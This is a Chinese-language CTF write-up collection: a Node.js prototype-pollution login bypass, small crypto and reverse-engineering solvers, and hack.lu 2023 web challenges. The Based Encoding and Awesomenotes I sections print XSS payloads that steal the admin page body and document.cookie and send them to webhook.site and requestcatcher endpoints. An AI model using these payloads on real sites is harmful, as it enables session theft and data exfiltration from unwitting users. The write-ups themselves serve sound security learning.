<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(k);</span><br><span class="line">    <span class="keyword">if</span> (k.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;username&quot;</span> &amp;&amp; req.<span class="property">body</span>[k].<span class="title function_">toLowerCase</span>() == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;You can&#x27;t use that username.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj[k.<span class="title function_">toLowerCase</span>()] = req.<span class="property">body</span>[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">username</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">password</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;h&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这题略显逆天，本地node调试和web路由得到的结果不同，会将原本传入的json解析成以下的结果</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="punctuation">[</span>&#x27;__proto__&#x27;<span class="punctuation">]</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> username<span class="punctuation">:</span> &#x27;admin&#x27; <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  password<span class="punctuation">:</span> &#x27;a&#x27;<span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这就会绕过判断，但是实际上我本地调试的时候，因为直接建立的是一个对象了，所以事先完成了污染的过程，才会fuzz不过</p>
<p>所以这题重点在于web传输过程和本地测试是不同的</p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="crypto">crypto</h2>
<h3 id="Pen-and-Paper">Pen and Paper</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keystream</span>(<span class="params">key, length</span>):</span><br><span class="line">    keystream = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(keystream) &lt; length:</span><br><span class="line">        keystream.extend(key)</span><br><span class="line">        key = key[<span class="number">1</span>:] + key[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> keystream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    keystream = generate_keystream(key, <span class="built_in">len</span>(ciphertext))</span><br><span class="line">    decrypted = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> ciphertext[i] <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            decrypted_char_index = (ALPHABET.index(ciphertext[i]) - keystream[i]) % <span class="number">26</span></span><br><span class="line">            decrypted_char = ALPHABET[decrypted_char_index]</span><br><span class="line">            decrypted.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(ciphertext[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ciphertext.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line">key = [<span class="number">12</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">16</span>, <span class="number">12</span>] <span class="comment"># 慢慢调</span></span><br><span class="line"></span><br><span class="line">plaintext = decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Message:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext.lower())</span><br></pre></td></tr></table></figure>
<h2 id="Re">Re</h2>
<h3 id="JaVieScript">JaVieScript</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">&quot;maple&#123;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> honk = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">hash</span>(<span class="params">string</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> utf8 = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>().<span class="title function_">encode</span>(string);</span><br><span class="line">  <span class="keyword">const</span> hashBuffer = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">digest</span>(<span class="string">&quot;SHA-256&quot;</span>, utf8);</span><br><span class="line">  <span class="keyword">const</span> hashArray = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(hashBuffer));</span><br><span class="line">  <span class="keyword">const</span> hashHex = hashArray</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">bytes</span>) =&gt;</span> bytes.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>))</span><br><span class="line">    .<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> hashHex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">constructflag</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">32</span>; i &lt;= <span class="number">126</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> fleg = <span class="string">&quot;maple&#123;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fleg += &#123;&#125;.<span class="title function_">toString</span>()[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    fleg += <span class="string">&quot;aN&quot;</span>; <span class="comment">//NaN</span></span><br><span class="line">    <span class="keyword">const</span> char = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i);</span><br><span class="line">    fleg += <span class="string">&quot;a&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fleg += char.<span class="title function_">repeat</span>(<span class="number">4</span>) + <span class="string">&quot;as&quot;</span> + <span class="string">&quot;_are_a_mId_FruiT&#125;&quot;</span>;  <span class="comment">// [null]</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (<span class="keyword">await</span> <span class="title function_">hash</span>(fleg)) ==</span><br><span class="line">      <span class="string">&quot;bfe06d1e92942a0eca51881a879a0a9aef3fe75acaece04877eb0a26ceb8710d&quot;</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(fleg);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">constructflag</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023hackluCTF</title>
    <url>/2023/10/17/16-47-15/</url>
    <content><![CDATA[<h1>2023hackluCTF</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="Based-Encoding">Based Encoding</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        flash(<span class="string">&quot;Please log in&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;create.html&quot;</span>, logged_out=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.form[<span class="string">&quot;text&quot;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Missing text&quot;</span></span><br><span class="line">        text = request.form[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(text) &gt; <span class="number">1000</span>:</span><br><span class="line">            flash(<span class="string">&quot;Too long!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&quot;/create&quot;</span>)</span><br><span class="line">        encoded = based91.encode(text.encode() <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-f0-9]+$&quot;</span>, text) <span class="keyword">and</span> <span class="built_in">len</span>(text) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">else</span> <span class="built_in">bytes</span>.fromhex(text))</span><br><span class="line">        encoding_id = create_encoding(session[<span class="string">&quot;username&quot;</span>], encoded)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&quot;/e/<span class="subst">&#123;encoding_id&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输入的数据很通过base91的加密(可以分为普通字符和16进制两种情况)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encoded = based91.encode(text.encode() <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-f0-9]+$&quot;</span>, text) <span class="keyword">and</span> <span class="built_in">len</span>(text) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">else</span> <span class="built_in">bytes</span>.fromhex(text))</span><br></pre></td></tr></table></figure>
<p>那么对需要输入的数据进行一次解码转为16进制就可以将想要的字符成功注入了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;unsafe-inline&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
<p>使用了CSP头<code>'unsafe-inline'</code>，允许script标签的使用</p>
<p>同时我们的目标是得到admin的主页的连接</p>
<p>原本我的初步想法是通过fetch外带，但是卡在了base91的字符集里面没有<code>.</code>，导致浪费时间在绕过的情况下，赛后就发现实际上是使用<code>String[&quot;fromCharCode&quot;](46)</code>，就可以成功添加。</p>
<p>然后还有一个失误是在我使用ifame标签进行include主页，然后让admin访问的时候将数据外带，但是有个问题在于会将我创建的标签的语句直接发送，而不是渲染之后的body。所以这条路就堵死了。</p>
<p>因此一种方法是使用fetch加上回调函数模拟数据外带，还有一个手法是document.write的方法绕过字符限制</p>
<p>exp1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">fetch(&quot;/&quot;)</span></span><br><span class="line"><span class="string">    [&quot;then&quot;](x =&gt; x[&quot;text&quot;]())</span></span><br><span class="line"><span class="string">    [&quot;then&quot;](x =&gt; fetch(&quot;https://nice&quot;+String[&quot;fromCharCode&quot;](46)+&quot;requestcatcher&quot;+String[&quot;fromCharCode&quot;](46)+&quot;com/test&quot;, &#123;</span></span><br><span class="line"><span class="string">        method: &quot;post&quot;,</span></span><br><span class="line"><span class="string">        body: x</span></span><br><span class="line"><span class="string">    &#125;))</span></span><br><span class="line"><span class="string">&lt;/script&gt;aaa</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">text = decode(s).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line">encoded = encode(text.encode() <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-f0-9]+$&quot;</span>, text) <span class="keyword">and</span> <span class="built_in">len</span>(text) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">else</span> <span class="built_in">bytes</span>.fromhex(text))</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure>
<p>存在通过<code>String[&quot;fromCharCode&quot;](46)</code>去fetch到webhook一直会寄掉的问题</p>
<p>exp2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ss=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">fetch(&quot;/&quot;)</span></span><br><span class="line"><span class="string">    [&quot;then&quot;](x =&gt; x[&quot;text&quot;]())</span></span><br><span class="line"><span class="string">    [&quot;then&quot;](x =&gt; fetch(&quot;https://webhook.site/d7f943a5-32eb-47cc-a430-37e1398206b4&quot;, &#123;</span></span><br><span class="line"><span class="string">        method: &quot;post&quot;,</span></span><br><span class="line"><span class="string">        body: x</span></span><br><span class="line"><span class="string">    &#125;))</span></span><br><span class="line"><span class="string">&lt;/script&gt;aaa</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ss = (base64.b64encode(ss.encode()).decode())</span><br><span class="line">s = <span class="string">f&#x27;&lt;script&gt;document[&quot;write&quot;](atob(`<span class="subst">&#123;ss&#125;</span>`));&lt;/script&gt;aaaaa&#x27;</span></span><br><span class="line">text = decode(s).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line">encoded = encode(text.encode() <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-f0-9]+$&quot;</span>, text) <span class="keyword">and</span> <span class="built_in">len</span>(text) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">else</span> <span class="built_in">bytes</span>.fromhex(text))</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure>
<p>这个方法的扩展性更大</p>
<h3 id="Awesomenotes-I">Awesomenotes I</h3>
<p>看文档的题目，说一下思路</p>
<p>web应用是rust写的，但是写得还是比较浅显易懂的，没做复杂的抽象</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// build our application with a single route</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = Router::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">get</span>(home))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/create&quot;</span>, <span class="title function_ invoke__">get</span>(create))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/report&quot;</span>, <span class="title function_ invoke__">get</span>(report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/note/:note&quot;</span>, <span class="title function_ invoke__">get</span>(note))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/api/report&quot;</span>, <span class="title function_ invoke__">post</span>(take_report))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/api/note/:note&quot;</span>, <span class="title function_ invoke__">get</span>(get_note))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/api/note&quot;</span>, <span class="title function_ invoke__">post</span>(upload_note))</span><br><span class="line">        .<span class="title function_ invoke__">nest_service</span>(<span class="string">&quot;/static&quot;</span>, ServeDir::<span class="title function_ invoke__">new</span>(<span class="string">&quot;public/static&quot;</span>));</span><br><span class="line">    <span class="comment">// run it with hyper on localhost:3000</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">server</span> =</span><br><span class="line">        axum::Server::<span class="title function_ invoke__">bind</span>(&amp;<span class="string">&quot;0.0.0.0:3000&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>()).<span class="title function_ invoke__">serve</span>(app.<span class="title function_ invoke__">into_make_service</span>());</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;🚀 App running on 0.0.0.0:3000 🚀&quot;</span>);</span><br><span class="line">    server.<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>路由如上，比如<code>.route(&quot;/&quot;, get(home))</code>意思是在根目录，使用get传参，将参数给home函数进行处理</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload_note</span>(</span><br><span class="line">    <span class="keyword">mut</span> multipart: Multipart,</span><br><span class="line">) <span class="punctuation">-&gt;</span> (StatusCode, <span class="type">Result</span>&lt;HeaderMap&lt;HeaderValue&gt;, &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>&gt;) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span>: <span class="type">Option</span>&lt;<span class="type">String</span>&gt; = <span class="literal">None</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">next_field</span>().<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Some</span>(name) = field.<span class="title function_ invoke__">name</span>() <span class="keyword">else</span> &#123; <span class="keyword">continue</span> &#125;;</span><br><span class="line">        <span class="keyword">if</span> name != <span class="string">&quot;note&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Ok</span>(data) = field.<span class="title function_ invoke__">text</span>().<span class="keyword">await</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        body = <span class="title function_ invoke__">Some</span>(data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">Some</span>(body) = body <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">return</span> (StatusCode::BAD_REQUEST, <span class="title function_ invoke__">Err</span>(<span class="string">&quot;Malformed formdata&quot;</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> body.<span class="title function_ invoke__">len</span>() &gt; <span class="number">5000</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">return</span> (StatusCode::PAYLOAD_TOO_LARGE, <span class="title function_ invoke__">Err</span>(<span class="string">&quot;Note too big&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">safe</span> = ammonia::Builder::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">tags</span>(hashset![<span class="string">&quot;h1&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;div&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">add_generic_attribute_prefixes</span>(&amp;[<span class="string">&quot;hx-&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">clean</span>(&amp;body)</span><br><span class="line">        .<span class="title function_ invoke__">to_string</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">name</span> = [<span class="number">0u8</span>; <span class="number">32</span>];</span><br><span class="line">    fs::File::<span class="title function_ invoke__">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_exact</span>(&amp;<span class="keyword">mut</span> name)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read urandom&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">name</span> = <span class="type">String</span>::<span class="title function_ invoke__">from_iter</span>(name.<span class="title function_ invoke__">map</span>(|c| <span class="built_in">format!</span>(<span class="string">&quot;&#123;:02x&#125;&quot;</span>, c)));</span><br><span class="line">    fs::<span class="title function_ invoke__">write</span>(<span class="built_in">format!</span>(<span class="string">&quot;public/upload/&#123;:&#125;&quot;</span>, name), safe).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to write note&quot;</span>);</span><br><span class="line">    (</span><br><span class="line">        StatusCode::FOUND,</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HeaderMap::<span class="title function_ invoke__">from_iter</span>([(</span><br><span class="line">            LOCATION,</span><br><span class="line">            <span class="built_in">format!</span>(<span class="string">&quot;/note/&#123;:&#125;&quot;</span>, name).<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>(),</span><br><span class="line">        )])),</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键看这个函数</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">safe</span> = ammonia::Builder::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">tags</span>(hashset![<span class="string">&quot;h1&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;div&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">add_generic_attribute_prefixes</span>(&amp;[<span class="string">&quot;hx-&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">clean</span>(&amp;body)</span><br><span class="line">        .<span class="title function_ invoke__">to_string</span>();</span><br></pre></td></tr></table></figure>
<p>白名单允许h1，p，div的标签的使用，其余标签都无法通过，允许以<code>hx-</code>开头的属性值</p>
<p>原本看到rust出现了一个2023的xss CVE，还以为是rust本身的问题，后来看了一下，是底层逻辑问题直接导致的直接注入，跟这个没啥关系，后来查到了</p>
<p><a href="https://htmx.org/">https://htmx.org/</a></p>
<p>使用了大量的hx-开头的属性对html进行增强，然后就是开始翻文档了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hx-get</span>=<span class="string">&quot;/example&quot;</span>&gt;</span>Get Some HTML<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是没办法直接对绝对路径发起请求，后来翻到了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hx-on:click</span>=<span class="string">&quot;alert(&#x27;Clicked!&#x27;)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时存在</p>
<p><a href="https://htmx.org/reference/">https://htmx.org/reference/</a></p>
<p>各种属性和事件处理</p>
<p>原本的想法是使用htmx:beforeRequest在发起请求的使用进行alert，但是失败了，因为请求没有成功，然后就是发现失败的原因是存在报错，之后又是找了半天找了hx-on这个属性可以自动在不同情况下监听事件进行自定义行为</p>
<p>然后构造出来</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hx-get</span>=<span class="string">&quot;/&quot;</span> <span class="attr">hx-on</span>=<span class="string">&quot;htmx:targetError: fetch(`https://webhook.site/d7f943a5-32eb-47cc-a430-37e1398206b4/?a=`+document.cookie)&quot;</span>&gt;</span></span><br><span class="line">    Get Info!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>自己点击没有问题，然后设置自动触发</p>
<p>使用<code>hx-trigger=&quot;every 2s&quot;</code>，每两秒进行一次请求(，这个仅仅针对hx-get同系列的事件)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">hx-get</span>=<span class="string">&quot;/&quot;</span> <span class="attr">hx-trigger</span>=<span class="string">&quot;every 2s&quot;</span> <span class="attr">hx-on</span>=<span class="string">&quot;htmx:targetError: fetch(`https://webhook.site/d7f943a5-32eb-47cc-a430-37e1398206b4/?a=`+document.cookie)&quot;</span>&gt;</span></span><br><span class="line">    Get Info!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ps：htmx版本是1.9.5，hx-on的事件监听写法需要是已弃用的写法（文档甚至没写啥时候弃用的，也是卡了一会）</p>
<p>然后把cookie放进去访问</p>
<p><a href="https://awesomenotes.online/api/note/flag">https://awesomenotes.online/api/note/flag</a></p>
<p>另外一个思路看</p>
<p><a href="https://www.youtube.com/watch?v=XNTX_wvltcU">https://www.youtube.com/watch?v=XNTX_wvltcU</a></p>
<h3 id="Awesomenotes-II">Awesomenotes II</h3>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">safe</span> = ammonia::Builder::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">add_tags</span>(TAGS)</span><br><span class="line">        .<span class="title function_ invoke__">add_tags</span>(&amp;[<span class="string">&quot;style&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">rm_clean_content_tags</span>(&amp;[<span class="string">&quot;style&quot;</span>])</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Thank god we don&#x27;t have any more XSS vulnerabilities now 🙏</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// .add_generic_attribute_prefixes(&amp;[&quot;hx-&quot;])</span></span><br><span class="line">        .<span class="title function_ invoke__">clean</span>(&amp;body)</span><br><span class="line">        .<span class="title function_ invoke__">to_string</span>();</span><br></pre></td></tr></table></figure>
<p>代码意思是允许style标签，以及TAGS的标签，但是会将style标签进行过滤</p>
<p>通过自带的example，可以允许一些html原生标签，如<code>&lt;br&gt;</code>,<code>&lt;img&gt;</code>等等</p>
<p>一种做法是通过<code>&lt;annotation-xml&gt;</code>标签,可以使用<code>encoding</code>属性，表示注释中语义信息的编码</p>
<p>然后翻一下文档</p>
<p><a href="https://www.w3.org/TR/MathML3/chapter5.html#mixing.semantic.annotations">https://www.w3.org/TR/MathML3/chapter5.html#mixing.semantic.annotations</a></p>
<p>可以找到example</p>
